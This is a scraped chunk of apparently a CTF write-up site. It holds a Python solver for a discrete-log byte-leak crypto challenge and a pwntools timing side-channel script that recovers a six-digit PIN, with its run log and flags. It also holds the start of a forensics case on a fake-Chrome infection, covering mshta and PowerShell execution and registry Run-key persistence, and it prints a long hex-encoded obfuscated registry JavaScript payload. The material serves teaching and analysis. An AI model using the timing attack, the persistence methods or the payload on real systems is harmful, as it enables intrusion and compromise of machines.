relationships.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_8_Log-Folly/#3-relationship-between-rotated-exponents","title":"3. Relationship Between Rotated Exponents","text":"<p>Definition:</p> <p>x0 = b0\u00b7256^(n\u22121) + b1\u00b7256^(n\u22122) + \u2026 + b(n\u22121)</p> <p>x1 = b1\u00b7256^(n\u22121) + b2\u00b7256^(n\u22122) + \u2026 + b0</p> <p>Compute:</p> <p>x1 \u2212 256 \u00b7 x0 = b0 \u00b7 (1 \u2212 256^n)</p> <p>This is an exact integer identity.</p> <p>Reduce modulo (p \u2212 1) because exponents in modulo p arithmetic work mod (p \u2212 1):</p> <p>Let:</p> <ul> <li>e0 = x0 mod (p\u22121)</li> <li>e1 = x1 mod (p\u22121)</li> <li>K = (1 \u2212 256^n) mod (p\u22121)</li> </ul> <p>Then:</p> <p>e1 \u2212 256\u00b7e0 \u2261 K\u00b7b0 (mod p\u22121)</p> <p>Now convert back into group values:</p> <p>h0 = 2^e0 mod p</p> <p>h1 = 2^e1 mod p</p> <p>Compute:</p> <p>t0 = h1 \u00b7 h0^(\u2212256) mod p</p> <p>t0 = 2^(K\u00b7b0) mod p</p> <p>This depends on only:</p> <ul> <li>the constant K</li> <li>the unknown byte b0</li> <li>the small brute-force space 0\u2013255</li> </ul> <p>Thus, recovering a byte requires checking at most 256 possibilities, not solving a discrete log.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_8_Log-Folly/#4-generalizing-to-all-bytes","title":"4. Generalizing to All Bytes","text":"<p>For each rotation i:</p> <p>t(i) = leak(i+1) \u00b7 leak(i)^(\u2212256) mod p</p> <p>t(i) = 2^(K\u00b7b(i)) mod p</p> <p>Wrapping around for the last byte:</p> <p>leak(n) = leak(0)</p> <p>So each of the n bytes is recovered individually by checking all b \u2208 [0, 255]:</p> <p>Find b such that:</p> <p>2^(K b) mod p = t(i)</p> <p>This is trivial and fast.</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_8_Log-Folly/#5-complete-solver-python","title":"5. Complete Solver (Python)","text":"<p>Paste this into a script:</p> <pre><code>from Crypto.Util.number import inverse\n\nwith open(\"out.txt\") as f:\nlines = [l.strip() for l in f.readlines()]\n\np = int(lines[0].split()[1])\nleaks = [int(l.split()[1]) for l in lines[1:]]\n\nn = len(leaks)\npm1 = p - 1\n\nK = (1 - pow(256, n, pm1)) % pm1\n\nlookup = { }\nfor b in range(256):\nlookup[pow(2, (K * b) % pm1, p)] = b\n\nflag_bytes = []\nfor i in range(n):\nh_i = leaks[i]\nh_j = leaks[(i + 1) %n]\n\ninv = pow(h_i, pm1 - 1, p)\nt = (h_j * pow(inv, 256, p)) % p\n\nflag_bytes.append(lookup[t])\n\nflag = bytes(flag_bytes).decode()\nprint(flag)\n</code></pre>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_8_Log-Folly/#6-final-results","title":"6. Final Results","text":"<p>Recovered FLAG:</p> <p>csd{n0t_s0_unbr34k4bl3_bc3e9f1c}</p> 2026-02-28 20:23:362026-03-01 01:23:36"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_9_Time-to-Escalate/","title":"Time to Escalate","text":""},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_9_Time-to-Escalate/#day-9-time-to-escalate","title":"day 9 Time to Escalate","text":"<p>category : Miscellaneous</p>"},{"location":"ctf/advent-of-cyber_cyberstudent_2025/day_9_Time-to-Escalate/#description","title":"Description","text":"<p>12/09 10:42 PM - We restarted the challenge instance platform, and the issue appears to be resolved. We will continue to monitor the system in case the problem recurs.</p> <p>12/09 10:27 PM EST - The remote instance seems to be down, and we are investigating. We will release an update when it's back online.</p> <p>Three elves from the Wrapping Division (Jingle, Tinsel, and Sprocket) are trapped in Elevator Shaft 3B after a KRAMPUS SYNDICATE intrusion locked down the control panel.</p> <p>Our forensics team recovered partial intel: the Syndicate replaced the elevator's authentication module with a hastily written PIN validator. The elevator panel accepts a 6 digit PIN, and each incorrect\u00a0attempt triggers a 3 second lockout, so brute force isn't viable.</p> <p>Here's the strange part: even when maintenance tested the correct PIN, the system took an unusually long time to process it. Our hardware team suspects the validator is doing something weird under the hood,\u00a0but we haven't had time to investigate further.</p> <p>Time is running out. The elves have limited candy cane rations. Hurry up!</p> <p>Connect at:\u00a0<code>nc ctf.csd.lol 5040</code></p> <p>clue</p> <ul> <li>Time is more than just a constraint, it's also a clue.</li> <li>The validator checks digits one at a time. What happens to the response time when you get the first digit right?</li> </ul> <p>solver</p> <pre><code>from pwn import *\nimport re\nfrom time import sleep\n\nHOST, PORT = \"ctf.csd.lol\", 5040\n\ndef recv_until_prompt(r):\n    data = r.recvuntil(b\"Enter 6-digit PIN:\", timeout=15)\n    return data.decode(errors=\"ignore\")\n\ndef try_guess(r, guess, extra_delay=3.1):\n    r.sendline(guess.encode())\n\n    try:\n        out = recv_until_prompt(r)\n        # biar pacing stabil (opsional)\n        if extra_delay:\n            sleep(extra_delay)\n\n        m = re.search(r\"Debug: ([0-9.]+)s\", out)\n        t = float(m.group(1)) if m else 0.0\n        print(f\"   {guess} -&gt; {t:.3f}s\")\n        return t, out, False\n\n    except EOFError:\n        # server closed connection (often means success)\n        text = \"\"\n        try:\n            text = r.recvall(timeout=3).decode(errors=\"ignore\")\n        except Exception:\n            pass\n\n        print(f\"   {guess} -&gt; EOF (connection closed)\")\n        if text.strip():\n            print(\"\\n[!] Output before close:\\n\")\n            print(text)\n        return 999.0, text, True\n\ndef main():\n    r = remote(HOST, PORT)\n\n    banner = recv_until_prompt(r)\n    print(banner)\n\n    pin = \"\"\n\n    for pos in range(6):\n        print(f\"\\n[*] Solving digit {pos+1}/6, current prefix = '{pin or '\u2205'}'\")\n        best_digit = None\n        best_time = -1.0\n\n        for d in \"0123456789\":\n            guess = pin + d + \"0\" * (5 - pos)\n            t, out, solved = try_guess(r, guess, extra_delay=3.1)\n\n            # kalau server close koneksi, kemungkinan besar solve\n            if solved:\n                print(f\"\\n[\u2714] SOLVED while trying guess: {guess}\")\n                r.close()\n                return\n\n            if t &gt; best_time:\n                best_time = t\n                best_digit = d\n\n        pin += best_digit\n        print(f\"[+] Digit {pos+1} fixed as '{best_digit}' -&gt; PIN so far = {pin}, max time = {best_time:.3f}s\")\n\n    print(\"\\n==============================\")\n    print(f\"[\u2714] Final PIN recovered (this connection): {pin}\")\n    print(\"==============================\")\n\n    print(\"\\n[*] Submitting final PIN on same connection...\\n\")\n    r.sendline(pin.encode())\n    print(r.recvall(timeout=10).decode(errors=\"ignore\"))\n    r.close()\n\nif __name__ == \"__main__\":\n    main()\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Downloads/cyberstudents]\n\u2514\u2500$ python3 day9_gpt.py\n[+] Opening connection to ctf.csd.lol on port 5040: Done\n\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n\u2551         NPLD ELEVATOR CONTROL SYSTEM v3.2.1-DEBUG          \u2551\n\u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563\n\u2551  AUTH: 6-digit PIN required for emergency release          \u2551\n\u2551  WARNING: 3-second lockout between attempts                \u2551\n\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n\n[Attempt 1/100] Enter 6-digit PIN:\n\n[*] Solving digit 1/6, current prefix = '\u2205'\n   000000 -&gt; 0.402s\n   100000 -&gt; 0.395s\n   200000 -&gt; 0.407s\n   300000 -&gt; 0.376s\n   400000 -&gt; 0.424s\n   500000 -&gt; 0.396s\n   600000 -&gt; 0.710s\n   700000 -&gt; 0.403s\n   800000 -&gt; 0.391s\n   900000 -&gt; 0.407s\n[+] Digit 1 fixed as '6' -&gt; PIN so far = 6, max time = 0.710s\n\n[*] Solving digit 2/6, current prefix = '6'\n   600000 -&gt; 0.658s\n   610000 -&gt; 0.980s\n   620000 -&gt; 0.696s\n   630000 -&gt; 0.713s\n   640000 -&gt; 0.714s\n   650000 -&gt; 0.677s\n   660000 -&gt; 0.710s\n   670000 -&gt; 0.705s\n   680000 -&gt; 0.677s\n   690000 -&gt; 0.728s\n[+] Digit 2 fixed as '1' -&gt; PIN so far = 61, max time = 0.980s\n\n[*] Solving digit 3/6, current prefix = '61'\n   610000 -&gt; 0.969s\n   611000 -&gt; 1.316s\n   612000 -&gt; 1.025s\n   613000 -&gt; 0.999s\n   614000 -&gt; 1.020s\n   615000 -&gt; 1.013s\n   616000 -&gt; 0.978s\n   617000 -&gt; 1.045s\n   618000 -&gt; 0.969s\n   619000 -&gt; 1.005s\n[+] Digit 3 fixed as '1' -&gt; PIN so far = 611, max time = 1.316s\n\n[*] Solving digit 4/6, current prefix = '611'\n   611000 -&gt; 1.263s\n   611100 -&gt; 1.269s\n   611200 -&gt; 1.242s\n   611300 -&gt; 1.337s\n   611400 -&gt; 1.302s\n   611500 -&gt; 1.309s\n   611600 -&gt; 1.623s\n   611700 -&gt; 1.318s\n   611800 -&gt; 1.336s\n   611900 -&gt; 1.325s\n[+] Digit 4 fixed as '6' -&gt; PIN so far = 6116, max time = 1.623s\n\n[*] Solving digit 5/6, current prefix = '6116'\n   611600 -&gt; 1.600s\n   611610 -&gt; 1.616s\n   611620 -&gt; 1.579s\n   611630 -&gt; 1.588s\n   611640 -&gt; 1.662s\n   611650 -&gt; 1.624s\n   611660 -&gt; 1.611s\n   611670 -&gt; 1.620s\n   611680 -&gt; 1.858s\n   611690 -&gt; 1.621s\n[+] Digit 5 fixed as '8' -&gt; PIN so far = 61168, max time = 1.858s\n\n[*] Solving digit 6/6, current prefix = '61168'\n   611680 -&gt; 1.916s\n   611681 -&gt; 1.869s\n   611682 -&gt; 1.885s\n   611683 -&gt; 1.914s\n   611684 -&gt; 1.834s\n   611685 -&gt; 1.887s\n[+] Receiving all data: Done (204B)\n[*] Closed connection to ctf.csd.lol port 5040\n   611686 -&gt; EOF (connection closed)\n\n[!] Output before close:\n\n\n\u2713 ACCESS GRANTED in 1.874s\n\n\ud83c\udf84 ELEVATOR RELEASED! \ud83c\udf84\nJingle, Tinsel, and Sprocket have been freed!\n\nThe elves hand you a candy cane with a note:\ncsd{T1m1n9_T1M1N9_t1M1n9_1t5_4LL_480UT_tH3_t1m1n9}\n\n[\u2714] SOLVED while trying guess: 611686\n</code></pre> 2026-02-28 20:23:362026-03-01 01:23:36"},{"location":"ctf/forensics/","title":"List cases","text":"<ul> <li>From Fake Chrome to Shikata Shellcode: Rebuilding a Multi-Stage Infection Step by Step</li> </ul> 2026-02-28 20:23:362026-03-01 01:23:36"},{"location":"ctf/forensics/shikataganai/","title":"From Fake Chrome to Shikata Shellcode: Rebuilding a Multi-Stage Infection Step by Step","text":"","tags":["Forensics","Malware Analysis"]},{"location":"ctf/forensics/shikataganai/#from-fake-chrome-to-shikata-shellcode-rebuilding-a-multi-stage-infection-step-by-step","title":"From Fake Chrome to Shikata Shellcode: Rebuilding a Multi-Stage Infection Step by Step","text":"<p>We pulled these artifacts from a fried workstation. A user downloaded something from a shady site, and shortly after, the machine started lagging and throwing weird popups.</p> <p>The Task:</p> <p>I need a full forensic breakdown, covering:</p> <ul> <li>Attack Chain: How did the infection start and what executed?</li> <li>Persistence: How is the malware surviving?</li> <li>The Payload: Find the final stage and explain exactly what it does.</li> <li>IOCs: Relevant IPs, domains, or hashes.</li> </ul>","tags":["Forensics","Malware Analysis"]},{"location":"ctf/forensics/shikataganai/#investigation","title":"Investigation","text":"<p>Primary artifacts:</p> <ul> <li>NTUSER.DAT (/C/Users/FlagYard/NTUSER.DAT)  - Sysmon EVTX (/C/Windows/System32/winevt/Logs/Microsoft-Windows-Sysmon%254Operational.evtx)</li> <li>PowerShell Operational EVTX (/C/Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%254Operational.evtx)</li> <li>815624.bat (/C/Users/FlagYard/AppData/Local/ce3f5d/815624.bat)</li> <li> <p>dcf991.9f2207a (/C/Users/FlagYard/AppData/Local/ce3f5d/dcf991.9f2207a)</p> </li> <li> <p>The attack chain Run:</p> </li> </ul> <pre><code>strings -el /C/Windows/System32/winevt/Logs/Microsoft-Windows-Sysmon%254Operational.evtx &gt; /tmp/sysmon_u16.txt\n</code></pre> <p># Initial execution (fake Chrome.exe / PDF- XChange masquerade)   sed -n '1888,1970p' /tmp/sysmon_u16.txt</p> <p># mshta reading HKCU\\software\\99qzf2N\\hDF82oB  and spawning powershell   sed -n '2188,2365p' /tmp/sysmon_u16.txt</p> <p># Chrome injects regsvr32   sed -n '6540,6648p' /tmp/sysmon_u16.txt</p> <p># regsvr32 writes persistence keys   sed -n '6668,6778p' /tmp/sysmon_u16.txt</p> <p>We can see:</p> <ol> <li>2025-06-03 11:50:34.836 user runs C:\\Users\\FlagYard\\Desktop\\Chrome.exe (masquerading as PDF-XChange Viewer).</li> <li>2025-06-03 11:50:35.894 mshta.exe executes JS reading HKCU\\software\\99qzf2N\\hDF82oB.</li> <li>2025-06-03 11:50:36.713 PowerShell launch (iex $env:zpztyd).</li> <li>2025-06-03 11:53:35.699 Chrome injects into regsvr32.exe.</li> <li>2025-06-03 11:53:38.553 regsvr32 sets class open command to mshta reading HKCU\\software\\lirs\\orhmkbye.</li> <li> <p>2025-06-03 11:53:38.568 regsvr32 sets Run key to C:\\Users\\FlagYard\\AppData\\Local\\ce3f5d\\815624.bat.</p> </li> <li> <p>Reproduce persistence artifacts  Check the startup batch: /C/Users/FlagYard/AppData/Local/ce3f5d/815624.bat</p> </li> </ol> <pre><code>start \"nqM1blK1X1LW8QWaOqHEwL\" \"%LOCALAPPDATA%\\ce3f5d\\dcf991.9f2207a\"\n</code></pre> <p>So persistence is:</p> <ul> <li>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -&gt; 815624.bat.</li> <li> <p>Hijacked class open command -&gt; mshta -&gt; registry JS HKCU\\software\\lirs\\orhmkbye.</p> </li> <li> <p>Extract the registry JS from orhmkbye Dump the value:</p> </li> </ul> <pre><code>kLvh3rmbAeGborOYXmMcoozk = \"8WCHTDQe8jL96TQ9UrgeBKPjYMKn\";  YbeMpBSqmJu0xLiiFY = \"UCi8CVAxBsRTPZUEArJ1WniFEMbZhbvZ7bT4TtNqfVfP\";  E1NADdaQfJCMRCwTvMiHIV = \"31KcBqdvSRicNaGH79Akyjr8VYTqMHS\";  LvswLlrJn5Q2aBlvcnIgHLN = \"K0saIir59yOVzRGi\";  gHLNH5sSWpEwHlrvORD = \"amz85ez4LHPAKhIVyklzqYhQZ9ubrfFAUTn\";  BCRzEWHyiUk3EHeMfIfZ = \"yjplgCEjHnGSb3WiRNG6V8B9EpvVrl3yJxwqz1\";  NTIAIjOTgFH3acz3CWrlIB = \"NrNz88D8tzLXOSP4Jvj1shdBh2BDxVNWZZecRqvrqEJv6\";  XAvWazQNjwMDuxXebDRJz9u = \"Z6g02LZ4YxcVVZEH48sHBlnhjcNegycDEh4\";  Jhp39 = \"692745272f1801051c24232568351a524b13301c4406784b71751c18370531120003733016543a0b073d232e7c123a1c595c250316150b58051f0b0b2c753b25534c7a0925351a746c5012293765314d0f141f1d28203203005b26390a33381442106c78541a25240a28201c2923441823144929515d1f0438733a2f5b0a354e5c231f09743a2f011c193e7b335e4c6e0136217618033913644f1346760f650b0030055603460b1c0f003b470c1c7b651e122b75706f6507307135000303217624101508372934332631754f640c44787b401d4b7c353931743f5200782b333b767d120e1f21380511650c3c2e3c5d652e1108730d530d504d5b7c601b1c0017252828212331263b350c0d5f7d1c01302173516555084e534c0642340d5201652f0a2f1f140e440a393c1526040c2957313e063c45205e030028172b3c28564d194d5f521d313b19762b0b0c3a1619161f1e1674002c1434257d3b13131d6b0e021d005b0a354e67141c406a33087b1216060528617e7c110c6f056f432a46200a0b17717f222f0510652a1c126f0c2e5b022f154669136e240275706f6522343c6f0d4c684c104c4709032509111841591c1875015476181d774879565d7f4f6c11141658312a4b261b3f232b5a034814787c715b637045565043562e184f56381347711915253e3d073719242f2a15354a4e673f04160523186b24011c5d5466185f5732107759694e0e7d0748745a4011312056220434036c5063165b2b3039254b794c5e52550a0c4c0707745f106c785438323342470d122037026f27025303030d0234317f4d282a72710d1f233f4c63230b2008136c19255e5a401d313b65755b1c052b1f7105472d637e051d220c18171148220a1618351b6a2b011b2920120c2d2c02143f0c23253a5c0f2403141d3f2e402d284108275f0f3d5d476732002535230b27017f7f4a153c61222f2a150542782d77093203113361071b3e090e3c01073f11125b0b0f0e3d0d79245f0c15077832100d0b792f260325102d223e28497a7176630f3f5547193a2027130d0127567d7539241a7f091803207415782240190c121c01323220406337225727316f0c51090a0633657f053f0507320335032c3567590c3d34011a2619021e616b055a321272010d2a25023d023633546c7414147e092b281925152b6b2e5c2a021c6633082f0c3c7a2d096d35302f2f6760341216013229291430267d1a71033b09192e205c3421161b0d30774c11543c1854680438223319127202697e432e0b234f15321b4e0d344733567a39210e3a3b5232215608227b33111f3571361137611c02505a2325281946053303572524250b1a2f0410203a636d21692636695e01092b212628210f700d7f3e370d5b07231f1576435b05637d31053c1914012e3a40353c0d4224114f44080f1a241b2030030c2b293a2c143059520121100d042207145a375d5a137b173f6b57382d2430470d01565660043232156f015113310a47505766243719633a0a322c036338250813216f037c3a1e0c32651d16363b3e701b1b071636630b0e3101050127303f13557f125a361d6e430d2e2d0e1003170f7a675d0b0a094c1b04023974286454411d381c3b0b17331c147e031d5a1b431014673d683a3a1131015d00321c220e743302661c05233e3f0f2e310320036e3e52556a0e7f3b3378041d2f373476625b19147a541d2936021d2502146d78643c0c2106162c235e06386f47380c2101273b183d1929503d6724021a1f0d212d5b360a221f305e1007251263541e5c082f6266054c2a21212b0b0a596d613b0a3c710c2b1e15033449074d30042e01232304213d4a3a596e1a1411205b1d1d302434790e2b3401033515381a2e543435123d61142d145a3458740773060f0b5c2d1d0e300008295700567e2a33160a091b3e32161e512362260c12040508361d477d3e045f3b3517117912191118167b2926643e3d2a211b10286103002d2f120b0c34281e787b166401027a5c06171f161603100a525d033d1918623f033721001001514e2c1d006730633700135008026d1e24021577073217061138360210321f1c0e08033b6200360a00070d12141a2c796e2d53233652793e0e2e31450a770502665a1a107a6b153600041e257d54551f6c3f1a021e0d1437411f0955163234440563022164672a35562325747f400e0e2200353051070a340f1c253a705311762223616766152d21223d211f5a41634a157f6b18502d150324473e637d65130e3b200744457e0d2c7e1c152f115904362024330c0e1b0c153d012f1657046a5e310f253a07723338165671077003137b71303008563f0d701e486e7114772e797f2a133405157a27752f1c091702062d1a07633a210913212e1d6a09110303101d0f0e0173291b2117520d77550c2f2f19262719330f500a11582819795902311f0f16032e0c7d715e0819086e0c040c3934284a1c7b120d2e020b175c463c7f351b5b1c24672f6726313a1216203702007621173c3434245c1b3d371b34260335011a5c7e306b3c0854533934392a180a2e027458421b0437542d360c0220357554551f6c3f0404280d2c43740022543847341862213a2104241f3529231f122b1a1b212540231054271a2f0410203a705f0d7225147b59190f2b55362f06375e537f3b0228710c203d3e0c385f007c1e2c283f283b333e1c4e353e724317010e5b0b003f24067828030f1e172320090e1b6a3f001423245c0e3e2a3856710c012a195f001c300a27130d03567a7d053a3a2c553b513b440d3c700d752f1c0914043432431a5d28074e101f141853191200082e09552b0729220635000525732d002d2d63270c450d0d5070204407684b7e141008013d0703017877771f16087e36380d472339751065110d003e0b0733462a6126046d354f2c176803281463632c323c1731090c340f3b3b05073e3c3e250f2b1c0e2962792f672c10096a04152d2f32301602797e461a2e2b5c0622083926406155560f00391f2f24342f287307096f24460c2e793e0d31682d2a3a3d2624777b1111312d48202426220a3b701c3021634e275f0f3d686316121f2e3e7518355d507f3e371b5c072b2a152916572d771a04293b503a3f2122080c066d023921467b181b37361e0823081f05040135282c59515f2d550f025c0e3e2a385671077003137b713c2c7a0a0e20053045656e3639156f7e08383f2f156337762a0412141e02224f046038074d2a22394061620e0f323a1d170b1314332d2107120e59592f3e34012e26442715536f0e42050d6e4a1c3a255e22762a0a5259631f0f1c7a1f383707282b0035532d227a1d20132411397a2e0c713137313f73103f3c176f3e305d2e301c22303233347e163d335d3a0e0d1b2d2066762b6b371b5f7c043b0b041915252c770c432c0476521639080726400711617b17393731010a3f1c4e06206e01021b2000240a2e17661235172c0d060522243a220036305419092b3d0420105d010b465411710223481331103506375e5f602f763561183b3623293403056c12391e013f60043149520c11081923651a4a351f202506132c150c11742614090919625e31543a1b00322d3a1e586c135d0e3955092d1b7b3c44082e0241565c353a035419143945021f69310120310d3a5b0a30471c5d28034e283e1b1f7b052b38123e05100a1136702d18222c2f5e260b00240515271e2812676f714b3d0d625c03140f56151c180a65636048220801240223420c286b367a120d18390b62341939520b075c34342f14021f1a2c1605323837183c0c261d34313b055e0556183f2706251c1d6640377d211b576766377c0547162e046201651c147a082e366b1b08195f11500f0333345a12312c28735d0a6f3c1a350f05180121643c292539051c1215120a27595c081e553c0a01351b304a605f110208205c77010d050a3e7520086344542f163a6b18546a2d1c384507720639293833203c4426432300501a143b24430b0e3c3d0d220500022b137c3a145b055101310e08102e0f15072b605c0c7814167b62011b27281c1e2f307e6d6e2a332b55192f002f161d51566632192132053420471c5d28034e2835311f62630e46050072090b013e291c3107173677140b2d05381916205c4b530a305d2f196a45332e3115380700277a776436217d6a7e031d223439600f4404160b3d3c182f00290b39005c2a3c3a3d633a6f3200382c2b2c17210c0c37262b24002224035c182506360e3072792378271b76733e377803330e7307036e471b0b150c0b3035100d3172037d0b142d1f2f242613286b033c0943121f35622b010c1c2e02265f310b0d271d18311b57212f0c061e3f3210243159511d62133d75783f15070f03230f2e5606783b3428750709372e170554297c2f66073f1e37283e185220384f153b1e11031f1b01361a030516180532283b090a017e2f1003211b0b74382a0e56750c561d0351473034010e1e0b111156797e102a026b3806173f23437c27432f180231131d36011774270c093f3521117d193f0e1f2e3c05221e2171020f36052178040b2b2f240b083f01146841335629125f471a003e01390c2a0f7f5d411f0e075f7c2f2300233f7b034c07163d31241802423e40180c753a1e3c2f63263f3b1930312f2c2121080711703805470b2a2c0b67353c000e3479502e7c0d2d5f7d1f1e30292733252b795303222a385f02293d471e314403790032331b0027023b385107326b05111b3e576315252630062a082e1c2c38110c2a0b02211e130b1e242d1a302a465f097903207549201e042e1c2e183546537b302435761c163d3a0c1a5a295d3f32071e0e64281f075e22235f0b3b3f01571c101e3a0e3215081b0e22382f12150b7d24005636001b223a211e047507460317705764231a1113090a0e5b794f0f240270270c031e33157e2c53781b33210e1d2d114277061c5f3f3e314369382f111c1f2c5122153122023e261822631b0029243b050b1e1e1e7c70230029234f571a312e112d3d35017c7c5e120c0c4f282c121f283c5a1353051d2d2f303912113d710813623101313b78366d2f02202c2f2731761c3601262f245800290d1b34210d105b20484f237c2c32537e040e2e2b3c237729624351350b275115322d10093a54556e21222d1b21380e38234e0826701a1f18254736153e3620061b18310b0d271c0c311b57212f0c041c3f3210243159520a48133d75783048071f03230f2e564d7b2b3428750706223a3d0554297c2f22043f1e37283e170b35384f153b1e1149082101361a030a041b2f32283b0905587f3f1003211b042c3a2a0e56750c590e007b47303401010e0b111156797e102816513806173f23417e1d432f180231591d1c011774270c0c2b2521117d193f471c143c05221e213c0225360521780b572915240b083f0e4d7c6b335629125f49193a3e01390c2a0b6867411f0e075025383300233f7b030106163d31241802453f7a180c753a11623963263f3b19307b3b16212108071139383f470b2a2c0b602306000e34795f706b372d5f7d1f1e793f0d33252b795307363a385f0229321a1e3144037900327a0c3a27023b385e15247b05111b3e572615352630062a073f081638110c2a0b00360e130b1e24220f242a465f0979036f6263201e042e1c2e183546537b302437770c163d3a0c15072b673f32071e0e613c1f075e22235f432f3f01571c101e3a180815081b0e227b3912150b7d24001d35001b223a211e006117460317705720361a1113090a01486d650f240270270c032433157e2c53301b09210e1d2d114177061c5f3f3e31447e122f111c1f2c52223f3122023e261b36591b00292434591c0e1e1e7c702c5c3e334f571a312e112e0735017c7c5101191c4f282c1210332b5a1353051d223f243912113d710702610b01313b7839353902202c2f273e2b1c2601262f24575f3e1d1b34210d105a23584f237c2c3d097e040e2e2b3c2c2b3f624351350b275115082d10093a5b0d7a21222d1b21380d39334e08267015450f0f4736153e3667063118310b0d28420e211b57212f03580a3f32102431560d1e62133d75783003072503230f2e59596f11342875070932392d0554297c2f6410151e37283e185436024f153b1e1e5b0b3101361a0305150c1532283b0905157e151003211b0b3f2e3a0e56750c5909176b4730340101441d2b1156797e1f7015513806173f23407d27432f18023e001e36011774270c423d3521117d193f0c0b3e3c05221e2e2c0225360521780b543d15240b083f0e036b51335629125f481a3a3e01390c2a0d6b5d411f0e075f353b3300233f7b0c5d06163d31241802432940180c753a11643973263f3b19307f2c2c2121080711712f3f470b2a2c0438353c000e34795f777f272d5f7d1f1e793c3733252b7953073600385f02293d001e31440379003d20183a27023b385105255105111b3e5760151f2630062a082f081638110c2a0b043634130b1e242d1c262a465f0979036e6163201e042e13770c2546537b30247e7636163d3a0c15063d5d3f32071e0e63281f075e22235f0b390501571c10112b0d1815081b0e227f3b12150b7d240f0e212a1b223a211e056207460317705763341a1113090a01486d4f0f2402702855171e33157e2c537b1b33210e1d2d1140603c1c5f3f3e314669282f111c1f230e20153122023e290a23731b002924341b1c1e1e1e7c70234629194f571a312e112e2d35017c7c51480c0c4f282c121f2f3f4a1353051d223a270312113d710702761b01313b7839333b28202c2f273e2e1c3601262f24575e3d371b34210d105820624f237c2c3d4f6a140e2e2b3c23713f584351350b280c15322d10093a5b0c7a1b222d1b21371f3b194e0826701a1d19254736153e362d042118310b0d271a0c1b1b57212f0c060a153210243159540958133d75783f10062503230f2e564c7b013428750709302d2d0554297c2039073f1e37283e185020284f153b1e11481c2101361a03055b183f32283b09055e6a051003211b0b3f393a0e56750c561c175147303401010c0a2b1156797e1f70027b3806173f23427d0d432f180231581e360117742703503f1f21117d193f461c043c05221e2e2f1535360521780b1d3d3f240b083f0e487f6b335629125f010d2a3e01390c25117f77411f0e075f7c3b3300233f7b0c5c07063d312418020e3e7a180c753a11213863263f3b1930322d3c2121080711363b05470b2a2c043f3606000e34795028681d2d5f7d1f1e792b3733252b79534c362a385f02293d431d0b44037900323d0c3a27023b385106315105111b3e572615252630062a082f1f3c38110c2a0b4a2224130b1e24220f2700465f09790c326263201e042e133e0c2546537b302b25771c163d3a0c15013e773f32071e0e603f25075e222350183b2f01571c101e3a1a1815081b0e22383802150b7d240054353a1b223a211e05622d460317705766371a1113090a0e5c7a650f2402702818172433157e2c537c1809210e1d2d110a74161c5f3f3e3e1b7f022f111c1f2c57362f3122023e261a36591b002924345c1f341e1e7c70234829234f571a31210a391735017c7c514b0d1c4f282c12103d28601353051d223f330312113d710858612101313b7836693838202c2f2731731f1c01262f2457152a1d1b34210d1f0134484f237c2c32517d040e2e2b3c237628624351350b275202222d10093a5b0e6d21222d1b21380e3b194e082670154418254736153e3666062118310b0d28440f1b1b57212f035e1d2f3210243156410948133d7578300e070f03230f2e5643783b3428750706232d2d0554297c2038132f1e37283e185221384f153b1e1e5b082101361a03055b182f32283b09055c7e2f1003211b0b76393a0e56750c565503514730340101471e2b1156797e1f3a01413806173f2c1e6927432f18023e02091c011774270c413c2521117d19301b1f143c05221e2e2c0135360521780b522905240b083f0e4c7c41335629125f041a003e01390c251f7c67411f0e075f353b0900233f7b030612063d31241802012a7a180c753a1e3c2f63263f3b193f222f3c2121080711382c3f470b2a2c0b672206000e34795f3d7f272d5f7d1f1e79280d33252b795c5b3500385f02293d450a21440379003230181027023b385105247b05111b3e576315252630062a073d091638110c2a045a2224130b1e2422452410465f0979032d6259201e042e1c28183546537b302437611c163d3a0c1a5e3d673f32071e0e642b35075e22235f40390501571c10112b0d1815081b0e2d253812150b7d240055223a1b223a21115c753d460317705763231a1113090a01017a4f0f2402702818030e33157e2c537a0f09210e1d2d1144743c1c5f3f3e3e1d7e282f111c1f230f35053122023e261b21591b00292434160b1e1e1e7c7023033d334f571a31210e3a2d35017c7c5e100e364f282c121f293c601353051d223f273912113d710858621b01313b7836212f2b2405210617210c0c37262b2f710b233503390f1d075d1d765f0a720d1b5f7914382e2f3705252c79764f31077f5f04272e23212a7d546e1f653f030706101237551b316b473c3418623d3b1b68201e50392f2228231c1b3a214538302215305e2d1f0b3f010e0b5a00365c7505152b21222a1b3e635864157a366a21372f2e77204306067d0428640525013126402428501c151e3c46082134230d13281a0c1132353b285707522b10033a3e003c13212f595a017717387f093d321a11130f05025a6e61002f150a0951002406337822400237240438342d3c14752c295a24233a035415150f09043c053867100f2d181018215c5c142d2a273a16205c497c420e552f09795f00481f2c162a131c7c58060